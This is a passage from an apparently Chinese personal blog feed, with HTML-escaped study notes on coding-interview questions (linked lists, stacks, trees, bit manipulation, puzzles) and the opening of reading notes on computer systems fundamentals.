  &lt;li&gt;假设你有一个isSubstring函数，可以检测一个字符串是否是另一个字符串的子串。给出字符串s1和s2，只使用一次isSubstring就能判断s2是否是s1的旋转字符串， 请写出代码。旋转字符串：”waterbottle”是”erbottlewat”的旋转字符串。&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;链表&quot;&gt;链表&lt;/h2&gt;

&lt;p&gt;链表问题有时会难倒不少求职者,因为链表元素访问用时不定,而且往往涉及递归&lt;/p&gt;

&lt;h3 id=&quot;快行指针技巧&quot;&gt;快行指针技巧&lt;/h3&gt;

&lt;p&gt;快行指针指的是同时用两个指针来迭代访问链表,只不过其中一个比另一个超前一些。&lt;/p&gt;

&lt;h3 id=&quot;递归问题&quot;&gt;递归问题&lt;/h3&gt;

&lt;p&gt;递归算法至少要占用 O( n) 空间,其中 n 为递归调用的层数。实际上,所有递归算法都可以转换成迭代法,只是后者实现起来可能要复杂得多。&lt;/p&gt;

&lt;h3 id=&quot;面试题目-1&quot;&gt;面试题目&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;编写代码,移除未排序链表中的重复结点。进阶如果不得使用临时缓冲区,该怎么解决?&lt;/li&gt;
  &lt;li&gt;实现一个算法,找出单向链表中倒数第 k 个结点。&lt;/li&gt;
  &lt;li&gt;实现一个算法,删除单向链表中间的某个结点,假定你只能访问该结点。&lt;/li&gt;
  &lt;li&gt;编写代码,以给定值 x 为基准将链表分割成两部分,所有小于 x 的结点排在大于或等于x 的结点之前。&lt;/li&gt;
  &lt;li&gt;给定两个用链表表示的整数,每个结点包含一个数位。这些数位是反向存放的,也就是个位排在链表首部。编写函数对这两个整数求和,并用链表形式返回结果。&lt;/li&gt;
  &lt;li&gt;给定一个有环链表,实现一个算法返回环路的开头结点。&lt;/li&gt;
  &lt;li&gt;编写一个函数,检查链表是否为回文。&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;栈与队列&quot;&gt;栈与队列&lt;/h2&gt;

&lt;h3 id=&quot;实现一个栈&quot;&gt;实现一个栈&lt;/h3&gt;

&lt;p&gt;栈采用后进先出( LIFO) 顺序。&lt;/p&gt;

&lt;h3 id=&quot;实现一个队列&quot;&gt;实现一个队列&lt;/h3&gt;

&lt;p&gt;队列采用先进先出( FIFO) 顺序。&lt;/p&gt;

&lt;h3 id=&quot;面试题目-2&quot;&gt;面试题目&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;描述如何只用一个数组来实现三个栈。&lt;/li&gt;
  &lt;li&gt;请设计一个栈，除pop与push方法，还支持min方法，可返回栈元素中的最小值。pop、push和min三个方法的时间复杂度必须为O(1)。&lt;/li&gt;
  &lt;li&gt;设想有一堆盘子，堆太高可能会倒下来。因此，在现实生活中，盘子堆到一定高度时，我们就会另外堆一堆盘子。请实现数据结构SetOfStacks，模拟这种行为。SetOfStacks应该由多个栈组成并且在前一个栈填满时新建一个栈。此外，SetOfStacks.push()和SetOfStacks.pop()应该与普通栈的操作方法相同（也就是说，pop()返回的值，应该跟只有一个栈时的情况一样）进阶：实现一个popAt(int index)方法，根据指定的子栈，执行 pop 操作。&lt;/li&gt;
  &lt;li&gt;在经典问题汉诺塔中，有3根柱子及N个不同大小的穿孔圆盘，盘子可以滑入任意一根柱子。一开始，所有盘子自底向上从大到小依次套在第一根柱子上（即每一个盘子只能放在更大的盘子上面）。移动圆盘时有以下限制：
 每次只能移动一个盘子&lt;br /&gt;
 盘子只能从柱子顶端滑出移到下一根柱子&lt;br /&gt;
 盘子只能叠在比它大的盘子上&lt;br /&gt;
 请运用栈，编写程序将所有盘子从第一根柱子移到最后一根柱子。&lt;/li&gt;
  &lt;li&gt;实现一个MyQueue类，该类用两个栈来实现一个队列。&lt;/li&gt;
  &lt;li&gt;编写程序，按升序对栈进行排序（即最大元素位于栈顶）。最多只能使用一个额外的栈存放临时数据，但不得将元素复制到别的数据结构中（如数组）。该栈支持如下操作：push、pop、peek和isEmpty。&lt;/li&gt;
  &lt;li&gt;有家动物收容所只收容狗与猫，且严格遵守“先进先出”的原则。在收养该收容所的动物时，收养人只能收养所有动物中“最老”（根据进入收容所的时间长短）的动物，或者，可以挑选猫或狗（同时必须收养此类动物中“最老”的）。换言之，收养人不能自由挑选想收养的对象。请创建适用于这个系统的数据结构，实现各种操作方法，比如enqueue、dequeueAny、dequeueDog和dequeueCat等。&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;树与图&quot;&gt;树与图&lt;/h2&gt;

&lt;p&gt;许多求职者会觉得树与图的问题是最难对付的。检索这两种数据结构比数组或链表等线性数据结构要复杂得多。&lt;/p&gt;

&lt;h3 id=&quot;需要注意的问题&quot;&gt;需要注意的问题&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;二叉树与二叉查找树&lt;/li&gt;
  &lt;li&gt;平衡与不平衡&lt;/li&gt;
  &lt;li&gt;完满和完整(Full and Complete)&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;二叉树遍历&quot;&gt;二叉树遍历&lt;/h3&gt;

&lt;p&gt;面试之前,你应该能够熟练实现中序、后序和前序遍历。其中最常见的是中序遍历,先遍历左子树,然后访问当前结点,最后遍历右子树。&lt;/p&gt;

&lt;h3 id=&quot;树的平衡红黑树和平衡二叉树&quot;&gt;树的平衡:红黑树和平衡二叉树&lt;/h3&gt;

&lt;p&gt;学习如何实现平衡树可助你成为更好的软件工程师,只不过面试中很少会问及平衡树。&lt;/p&gt;

&lt;h3 id=&quot;单词查找树-trie&quot;&gt;单词查找树( trie)&lt;/h3&gt;

&lt;p&gt;trie 树是 n 层树的一种变体,其中每个结点存储有字符。整棵树的每条路径自上而下表示一个单词。&lt;/p&gt;

&lt;h3 id=&quot;图的遍历&quot;&gt;图的遍历&lt;/h3&gt;

&lt;p&gt;大部分求职者都比较熟悉二叉树的遍历,但图的遍历则要难得多。广度优先搜索( BFS)更是难上加难。广度优先搜索( BFS) 和深度优先搜索( DFS) 通常用于不同的场景。如要访问最少的结点直至找到想找的结点, DFS 一般最为简单。我们可能搜索了该结点的成千上万个祖先结点,却还未搜索该结点的全部子结点。对于这种情况， 一般首选BFS。&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;深度优先搜索( DFS)&lt;/li&gt;
  &lt;li&gt;广度优先搜索( BFS)&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;面试题目-3&quot;&gt;面试题目&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;实现一个函数，检查二叉树是否平衡。在这个问题中，平衡树的定义如下：任意一个结点，其两棵子树的高度差不超过1。&lt;/li&gt;
  &lt;li&gt;给定有向图，设计一个算法，找出两个结点之间是否存在一条路径。&lt;/li&gt;
  &lt;li&gt;给定一个有序整数数组，元素各不相同且按升序排列，编写一个算法，创建一棵高度最小的二叉查找树。&lt;/li&gt;
  &lt;li&gt;给定一棵二叉树，设计一个算法，创建含有某一深度上所有结点的链表（比如，若一棵树的深度为D，则会创建出D个链表）。&lt;/li&gt;
  &lt;li&gt;实现一个函数，检查一棵二叉树是否为二叉查找树。&lt;/li&gt;
  &lt;li&gt;设计一个算法，找出二叉查找树中指定结点的“下一个”结点（即中序后继）。可以假定每个结点都含有指向父结点的连接。&lt;/li&gt;
  &lt;li&gt;设计并实现一个算法，找出二叉树中某两个结点的第一个共同祖先。不得将额外的结点储存在另外的数据结构中。注意：这不一定是二叉查找树。&lt;/li&gt;
  &lt;li&gt;你有两棵非常大的二叉树：T1，有几百万个结点；T2，有几百个结点。设计一个算法，判断T2是否为T1的子树。（如果T1有这么一个结点n，其子树与T2一模一样，则T2为T1的子树。也就是说，从结点n处把树砍断，得到的树与T2完全相同。）&lt;/li&gt;
  &lt;li&gt;给定一棵二叉树，其中每个结点都含有一个数值。设计一个算法，打印结点数值总和等于某个给定值的所有路径。注意，路径不一定非得从二叉树的根结点或叶结点开始或结束。&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;位操作&quot;&gt;位操作&lt;/h2&gt;

&lt;h3 id=&quot;位操作原理与技巧&quot;&gt;位操作原理与技巧&lt;/h3&gt;

&lt;h3 id=&quot;常见位操作获取设置清除以及更新位数据&quot;&gt;常见位操作：获取，设置，清除以及更新位数据&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;获取&lt;/p&gt;

    &lt;pre&gt;&lt;code&gt; boolean getBit( int num, int i) { 
     return ((num &amp;amp; (1 &amp;lt;&amp;lt; i)) != 0); 
 }
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;设置&lt;/p&gt;

    &lt;pre&gt;&lt;code&gt; int setBit( int num, int i) { 
      return num | (1 &amp;lt;&amp;lt; i); 
 }
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;置位&lt;/p&gt;

    &lt;pre&gt;&lt;code&gt; int setBit( int num, int i) { 
      return num | (1 &amp;lt;&amp;lt; i); 
 }		
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;清零&lt;/p&gt;

    &lt;pre&gt;&lt;code&gt; int clearBit( int num, int i) { 
      int mask = ~( 1 &amp;lt;&amp;lt; i); 
      return num &amp;amp; mask;
 }
	
 /* &amp;gt; 将 num 最高位至 i 位(含)清零：*/
 int clearBitsMSBthroughI( int num, int i) { 
      int mask = (1 &amp;lt;&amp;lt; i) - 1; 
      return num &amp;amp; mask;
 }
	
 /* 将 i 位至 0 位(含)清零 */
 int clearBitsIthrough0( int num, int i) { 
      int mask = ~(( 1 &amp;lt;&amp;lt; (i+ 1)) - 1);
      return num &amp;amp; mask;
 }
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;更新&lt;/p&gt;

    &lt;pre&gt;&lt;code&gt; int updateBit( int num, int i, int v) { 
      int mask = ~( 1 &amp;lt;&amp;lt; i); 
      return (num &amp;amp; mask) | (v &amp;lt;&amp;lt; i);
 }
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;面试题目-4&quot;&gt;面试题目&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;给定两个32位的整数N和M，以及表示比特位置的i和j。编写一个方法，将M插入到N中，使得M从N的第j位开始，到第i位结束，假定从j位到i位足以容纳M，也即是M=10011，那么j和i之间至少可容纳5个数，假如，不可能出现j=3,i=2的情况，因为第三位和第二位之间放不下M。&lt;/li&gt;
  &lt;li&gt;给定一个介于 0 和 1 之间的实数(如 0. 72), 类型为 double, 打印它的二进制表示。如果该数字无法精确地用 32 位以内的二进制表示,则打印 ERROR。&lt;/li&gt;
  &lt;li&gt;给定一个正整数,找出与其二进制表示中 1 的个数相同、且大小最接近的那两个数(一个略大,一个略小)。&lt;/li&gt;
  &lt;li&gt;解释代码(( n &amp;amp; (n- 1)) == 0) 的具体含义。&lt;/li&gt;
  &lt;li&gt;编写一个函数,确定需要改变几个位,才能将整数 A 转成整数 B。&lt;/li&gt;
  &lt;li&gt;编写程序,交换某个整数的奇数位和偶数位,使用指令越少越好(也就是说,位 0 与位 1 交换,位 2 与位 3 交换,依此类推)&lt;/li&gt;
  &lt;li&gt;数组 A 包含 0 到 n 的所有整数,但其中缺了一个。在这个问题中,只用一次操作无法取得数组 A 里某个整数的完整内容。此外,数组 A 的元素皆以二进制表示,唯一可用的的访问操作是从 A[ i] 取出第 j 位数据,该操作的时间复杂度为常数。请编写代码找出那个缺失的整数。你有办法在 O( n) 时间内完成吗？&lt;/li&gt;
  &lt;li&gt;有个单色屏幕存储在一个一维字节数组中,使得 8 个连续像素可以存放在一个字节里。屏幕宽度为 w, 且 w 可被 8 整除(即一个字节不会分布在两行上),屏幕高度可由数组长度及屏幕宽度推算得出。请实现一个函数 drawHorizontalLine( byte[] screen, int width, int x1, int x2, int y), 绘制从点( x1, y) 到点( x2, y) 的水平线。&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;智力题&quot;&gt;智力题&lt;/h2&gt;

&lt;h3 id=&quot;大声说出你的思路&quot;&gt;大声说出你的思路&lt;/h3&gt;

&lt;h3 id=&quot;总结规律和模式&quot;&gt;总结规律和模式&lt;/h3&gt;

&lt;p&gt;给定两条绳子， 每条绳子燃烧殆尽正好要用一个小时。 怎样用这两条绳子准确计量15分钟？注意这些绳子密度不均匀，因此烧掉半截绳子不一定正好用半小时。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;给定两条绳子， 燃烧殆尽各需要x分钟和y分钟， 我们可以计时x+y分钟。
给定一条需要燃烧x分钟的绳子， 我们可以计时x/2分钟。
燃烧绳子1用时x分钟， 绳子2用时y分钟， 则可以用第二条绳子计时(y-x)分钟或(y-x/2)分钟
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;略作变通&quot;&gt;略作变通&lt;/h3&gt;

&lt;p&gt;“九球称重”是一个经典面试题。给定9个球，其中8个球的重量相同，只有一个比较重。然后给定一个天平，可以称出左右两边哪边更重。最多用两次天平，找出这个重球。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;给定N个球，其中N能被3整除，称量一次便能找到包含重球的那一组球。
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;触类旁通&quot;&gt;触类旁通&lt;/h3&gt;

&lt;p&gt;要是卡壳了， 不妨考虑运用前面提到的算法题的五种解法：举例法， 简化推广法， 模式匹配法， 以及简单构造法。&lt;/p&gt;

&lt;h3 id=&quot;面试题&quot;&gt;面试题&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;有20瓶药丸， 其中19瓶装有1可/粒的药丸， 余下一瓶装有1.1克/粒的药丸。给你一台称重精准的天平， 怎么找出比较重的那瓶药丸？天平只能用一次&lt;/li&gt;
  &lt;li&gt;有个8*8棋盘， 其中对角的角落上， 两个方格被切掉了。给定31块多米诺骨牌， 一块骨牌恰好可以覆盖两个方格。 用这31块骨牌能否盖住整个棋盘？请证明你的答案&lt;/li&gt;
  &lt;li&gt;有两个水壶， 容量分别为5夸脱和3夸脱， 若水的供应量不限量（但没有量杯），怎么用这两个水壶得到刚好4夸克的水？注意， 这两个水壶呈不规则形状， 无法精准的装满半壶水。&lt;/li&gt;
  &lt;li&gt;有个岛上住着一群人， 有一天来了个游客，定了一个奇怪的规矩：所有蓝眼睛的人都必须尽快离开这个岛。每晚8点会有一个航班离岛。每个人都看得见别人眼睛的颜色，但不知道自己的（别人也不可以告知）。此外， 他们不知道岛上到底有多少人是蓝眼睛的， 只知道至少有一个人的额眼睛是蓝色的。所有蓝眼睛的人要花几天才能离开这个岛？&lt;/li&gt;
  &lt;li&gt;有栋建筑高100层。若从第N层或更高的楼层扔下来，鸡蛋就会破。若从第N层以下的楼层扔下来则不会破。给你2个鸡蛋请找出N， 并要求最差情况下扔鸡蛋的次数为最少。&lt;/li&gt;
  &lt;li&gt;走廊上又100个关上的储物柜。有个人先是将100个柜子全都打开。接着， 每数两个柜子关上一个。 然后， 在第三轮时， 再每隔两个就切换第三个柜子的开光状态（也就是将关上的柜子打开， 将打开的关上）。照此规律反复操作100次，在第i轮， 这个人会每数i个就切换第i个柜子的状态。当第100轮经过走廊时， 只切换第100个柜子的开关状态，此时有几个柜子是开着的？&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;数学概率&quot;&gt;数学概率&lt;/h2&gt;

&lt;p&gt;在面试碰到的许多数学问题， 其中很多看起来像是智力题， 其实大都可以运用逻辑， 有系统的解决。这些问题通常都以数学或计算机科学为基础。&lt;/p&gt;

&lt;h3 id=&quot;素数&quot;&gt;素数&lt;/h3&gt;

&lt;p&gt;每一个数都可以分解成素数为乘积。例如：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;84 = 2^2 * 3^1 * 5^0 * 7^1 * 11^0 * 13^0 * 17^0 ...

**整除**
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;上面的素数定理指出， 要想以x整除y（写作x/y，或mod(y, x) =0), x素因子分解的所有素数必须出现在y的素因子分解中&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>深入理解计算机系统</title>
   <link href="http://yanpeipan.github.io/2015/03/18/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F.html"/>
   <updated>2015-03-18T00:00:00+08:00</updated>
   <id>http://yanpeipan.github.io/2015/03/18/深入理解计算机系统</id>
   <content type="html">
&lt;h1 id=&quot;第1章-计算机系统漫游&quot;&gt;第1章 计算机系统漫游&lt;/h1&gt;

&lt;h2 id=&quot;信息就是位上下文&quot;&gt;信息就是位+上下文&lt;/h2&gt;
&lt;p&gt;系统中的所有信息——包括磁盘文件，存储器中的程序，存储器中存放的用户数据以及网络上传送的数据，都是由一串位表示的。区分不同数据对象的唯一方法是我们读到这些数据对象时的上下文。&lt;/p&gt;

&lt;h2 id=&quot;程序被其他程序翻译成不同的格式&quot;&gt;程序被其他程序翻译成不同的格式&lt;/h2&gt;
&lt;p&gt;预处理器，编译器，汇编器和链接器一起构成了编译系统（compilation system）。&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;预处理阶段。预处理器(cpp)根据以字符#开头的命令， 修改原始C程序， 通常以&lt;code&gt;.i&lt;/code&gt;作为文件扩展名。&lt;/li&gt;
  &lt;li&gt;编译阶段。 编译器(ccl)将.i翻译成.s, 它包含一个汇编语言程序。&lt;/li&gt;
  &lt;li&gt;汇编阶段。 汇编器(as)将.s翻译成机器语言指令， 把这些指令打包成可重定位目标程序(relocatable object program)的格式， 保存在.o文件中。&lt;/li&gt;
  &lt;li&gt;链接阶段。 链接器(ld)合并预编译好的文件， 生成可执行目标文件。&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;了解编译系统如何工作是大有益处的&quot;&gt;了解编译系统如何工作是大有益处的&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;优化程序性能&lt;/li&gt;
  &lt;li&gt;理解链接出现的错误&lt;/li&gt;
  &lt;li&gt;避免安全漏洞&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;处理器读并解释存储在存储器中的指令&quot;&gt;处理器读并解释存储在存储器中的指令&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;系统的硬件组成:
    &lt;ul&gt;
      &lt;li&gt;总线&lt;/li&gt;
      &lt;li&gt;I/O设备&lt;/li&gt;
      &lt;li&gt;主存&lt;/li&gt;
      &lt;li&gt;处理器&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;CPU在指令的要求下可能会执行以下操作：
    &lt;ul&gt;
      &lt;li&gt;加载：把一个字节或者一个字从主存复制到寄存器， 以覆盖寄存器原来的内容。&lt;/li&gt;
      &lt;li&gt;存储：把一个字节或者一个字从寄存器复制到主存的某个位置， 以覆盖这个位置上原来的内容。&lt;/li&gt;
      &lt;li&gt;操作：把两个寄存器的内容复制到ALU， ALU对这两个字做算术操作， 并将结果存放在一个寄存器中， 以覆盖该寄存器中原来的内容。&lt;/li&gt;
      &lt;li&gt;跳转：从指令本身抽取一个字， 并将这个字复制到程序计数器(PC)中， 以覆盖PC原来的值。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;高速缓存&quot;&gt;高速缓存&lt;/h2&gt;

&lt;p&gt;针对处理器与主存之间的差异， 系统设计者采用了更小， 更快的存储设备， 即告诉缓存存储器（简称高速缓存）， 作为暂时的集结区域。L1和L2高速缓存是用一种叫做静态随机访问存储器(SRAM)的硬件技术实现的。&lt;/p&gt;

&lt;h2 id=&quot;存储设备形成层次结构&quot;&gt;存储设备形成层次结构&lt;/h2&gt;

&lt;p&gt;存储器层次结构的主要思想是一层上的存储器作为低一层存储器的高速缓存。&lt;/p&gt;

&lt;h2 id=&quot;操作系统管理硬件&quot;&gt;操作系统管理硬件&lt;/h2&gt;

&lt;p&gt;所有应用程序对硬件的操作尝试都必须通过操作系统&lt;/p&gt;

&lt;p&gt;操作系统有两个基本功能:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;防止硬件被失控的应用程序滥用&lt;/li&gt;
  &lt;li&gt;向应用程序提供简单一致的机制来控制复杂而又大相径庭的低级硬件设备&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;操作系统通过几个基本的抽象概念来实现这两个功能：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;进程
    &lt;ul&gt;
      &lt;li&gt;进程是操作系统对一个正在运行的程序的一种抽象&lt;/li&gt;
      &lt;li&gt;处理器在进程间切换来实现并发执行多个进程， 这种机制成为&lt;code&gt;上下文切换&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;操作系统保持跟踪进程运行所需的所有状态信息， 也就是上下文， 当处理器决定要把控制权从当前进程转移到一个新进程时，就会进行上下文切换&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;线程
    &lt;ul&gt;
      &lt;li&gt;一个进程可以由多个成为线程的执行单元组成， 每个线程都运行在进程的上下文中，并共享同样的代码和全局数据&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;虚拟存储器 虚拟存储器为每个进程提供了抽象概念， 即虚拟地址空间
    &lt;ul&gt;
      &lt;li&gt;程序代码和数据 对于所有的进程来说， 代码是从同一固定位置开始的， 紧接着的是和C全局变量相对应的数据位置&lt;/li&gt;
      &lt;li&gt;堆 紧接着是运行时堆， 可以在运行时动态的扩展和收缩&lt;/li&gt;
      &lt;li&gt;共享库 大约在地址空间的中间部分是一块用来存放像C标准库和数据的区域&lt;/li&gt;
      &lt;li&gt;栈 位于用户虚拟地址顶部的是用户栈， 编译器用它来实现函数调用&lt;/li&gt;
      &lt;li&gt;内核虚拟存储器 地址空间顶部是的区域是为内核保留的， 内核总是驻留在内存中， 是操作系统的一部分&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;文件
    &lt;ul&gt;
      &lt;li&gt;文件就是字节序列，仅此而已&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;系统之间利用网络通信&quot;&gt;系统之间利用网络通信&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;网络可视为一个I/O设备&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;重要主题&quot;&gt;重要主题&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;并发和并行
并发(concurrency)是一个通用概念， 指一个同时具有多个活动的系统;并行(parallelism)指的是用并发使一个系统运行得更快
    &lt;ul&gt;
      &lt;li&gt;线程级并发 超线程， 有时称为同时多线程(simultaneous multi-threading)， 是一项允许一个CPU执行多个控制流的技术&lt;/li&gt;
      &lt;li&gt;指令级并行 在较低的抽象层次上， 处理器可以同时执行多条指令的属性成为指令级并发&lt;/li&gt;
      &lt;li&gt;单指令，多数据并行 即SIMD并行 一条指令产生多个可以并行执行的操作&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;计算机系统中抽象的重要性
    &lt;ul&gt;
      &lt;li&gt;抽象的使用是计算机科学中最重要的概念之一&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h1 id=&quot;第2章-信息的表示和处理&quot;&gt;第2章 信息的表示和处理&lt;/h1&gt;

&lt;p&gt;现代计算机存储和处理的信息以二值信号表示。&lt;/p&gt;

&lt;h2 id=&quot;信息存储&quot;&gt;信息存储&lt;/h2&gt;

&lt;p&gt;大多数计算机使用8位的块， 或者字节(byte)， 作为做小的可寻址的存储器单位。机器级程序将存储器视为一个非常大的字节数组，称为虚拟存储器(virtual memory)。存储器的每个字节都由一个唯一的数字标识， 称它为地址(address)，所有可能地址的集合称为虚拟地址空间(virtual address space)&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;十六进制表示法
    &lt;ul&gt;
      &lt;li&gt;用十六进制(hex)书写， 一个字节的值域为00-FF&lt;/li&gt;
      &lt;li&gt;二进制与十六进制的转换比较直接， 可以一次执行一个十六进制数字的转换（二进制每4位组， 对应一个十六进制数值）&lt;/li&gt;
      &lt;li&gt;在C语言中， 以0x或0X开头的数字常量被认为是十六进制的值&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;字
    &lt;ul&gt;
      &lt;li&gt;每台计算机都有一个字长(word size)， 指明整数和指针数据的标称大小(nominal size)。因为虚拟地址是以这样的一个字来编码的， 所以字长决定的最重要的系统参数就是虚拟地址空间的最大大小。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;数据大小
    &lt;ul&gt;
      &lt;li&gt;计算机和编译器都支持多种不同方式编码的数字格式， 如2字节，4字节，8字节整数和4字节和8字节浮点数。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;寻址和字节顺序
    &lt;ul&gt;
      &lt;li&gt;对于跨越多字节的程序对象，必须建立两个规则：这个对象的地址是什么， 以及在存储器中如何排列这些字节&lt;/li&gt;
      &lt;li&gt;几乎所有的机器上， 多字节对象都被存储为连续的字节序列， 对象的地址为所使用字节中最小的地址。&lt;/li&gt;
      &lt;li&gt;最低有效字节在最前面的方式称为小端法(little endian);最高有效字节在最前面的方式称为大端法(big endian)。对于大多数应用程序员来说， 他们机器所使用的字节顺序是完全不可见的。不过有些时候，字节顺序会成为问题：&lt;/li&gt;
    &lt;/ul&gt;
    &lt;ol&gt;
      &lt;li&gt;
        &lt;blockquote&gt;
          &lt;p&gt;网络应用程序的代码编写必须遵守建立的关于字节顺序的规定， 以确保发送方机器将它的内部表示转换成网络标准， 而接受方机器则将网络标准转换为它的内部表示。&lt;/p&gt;
        &lt;/blockquote&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;blockquote&gt;
          &lt;p&gt;当阅读表示整数数据的字节序列时字节顺序也很重要。通常在检查机器级程序时会出现这种情况。如：反汇编(disassembler)。&lt;/p&gt;
        &lt;/blockquote&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;blockquote&gt;
          &lt;p&gt;当编写规避正常的类型系统的程序时。在C语言中，可以使用强制类型转换(cast)来允许以一种数据类型引用一个对象，而这种数据类型与创建这个对象时定义的数据类型不同。&lt;/p&gt;
        &lt;/blockquote&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;表示字符串
    &lt;ul&gt;
      &lt;li&gt;C语言中字符串被编码为一个以null(其值为0)字符结尾的字符数组。每个字符都由某个标准编码来表示，最常见的是ASCII字符码。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;表示代码
    &lt;ul&gt;
      &lt;li&gt;不同类型的机器使用不同的且不兼容的指令和编码方式， 因此二进制代码是不兼容的。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;布尔代数(Bool algebra)简介
    &lt;ul&gt;
      &lt;li&gt;将逻辑值&lt;code&gt;TRUE&lt;/code&gt;和&lt;code&gt;FALSE&lt;/code&gt;编码为1和0, 设计出一种代数&lt;/li&gt;
      &lt;li&gt;将4个布尔运算扩展到位向量， 位向量就是有固定长度为w， 由0和1组成的串&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;C语言中的位级运算
    &lt;ul&gt;
      &lt;li&gt;| OR， &amp;amp; AND， ～ NOT， ^ EXCLUSIVE-OR&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;C语言中的逻辑运算
    &lt;ul&gt;
      &lt;li&gt;|| &amp;amp;&amp;amp; !，逻辑运算认为所有非零参数都表示为TRUE，而参数0表示FALSE&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;C语言中的移位运算
    &lt;ul&gt;
      &lt;li&gt;机器支持两种形式的右移：算术右移和逻辑右移，逻辑右移在左边补k个0, 算术右移是在左端补k个最高有效位的值&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;整数表示&quot;&gt;整数表示&lt;/h2&gt;

&lt;p&gt;用位来编码整数的两种不同方式：一种只能表示非负数，而另一种能够表示负数，零和正数&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;整数数据类型
    &lt;ul&gt;
      &lt;li&gt;C语言支持多种整数数据类型——表示有限范围的整数。&lt;/li&gt;
      &lt;li&gt;一个与机器相关的取值范围是大小指示符long， 大多数64位机器使用8个字节表示， 32位机器上使用4个字节表示&lt;/li&gt;
      &lt;li&gt;负数范围比整数的范围大1&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;无符号整数的编码
    &lt;ul&gt;
      &lt;li&gt;我们用一个函数&lt;code&gt;B2U&lt;/code&gt;(Binary bo Unsigned，长度为w, 向量为{x},如：[1011])来表示：&lt;/li&gt;
      &lt;li&gt;&lt;img src=&quot;http://forkosh.com/mathtex.cgi?formdata=%5Cusepackage%7Bmathtools%7D%0D%0A%5CSmall+B2U_w%28%5Cvec%7Bx%7D%29%0D%0A%7B%5Coverset%7B%5Cmathrm%7B%5Cbullet%7D%7D%7B%3D%5Cjoinrel%3D%7D%7D%0D%0A%5Csum_%7Bi%3D0%7D%5E%7Bw-1%7Dx_i2%5Ei&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
      &lt;li&gt;最小值0, 最大值：&lt;/li&gt;
